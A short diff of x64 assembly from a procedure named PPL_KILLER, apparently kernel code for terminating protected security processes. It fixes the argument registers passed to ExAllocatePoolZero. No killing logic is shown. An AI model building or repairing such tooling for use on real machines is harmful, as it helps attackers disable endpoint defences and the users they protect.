@@ -25,11 +25,11 @@ proc PPL_KILLER
 	CMP 	EAX, 0C0000004h
 	JNE @F 
 	
-	MOV 	RCX, [infoSize]
-	SHL 	RCX, 1 
-	XOR 	RDX, RDX 
-	MOV 	R8, 'PPLL'
-	CALL 	[ExAllocatePoolZero]
+	MOV     RDX, [infoSize]   
+	SHL     RDX, 1             
+	XOR     RCX, RCX           
+	MOV     R8, 'PPLL'       
+	CALL    [ExAllocatePoolZero]
 	TEST 	RAX, RAX 
 	JZ @F 
 	MOV 	[pInfoBuffer], RAX 
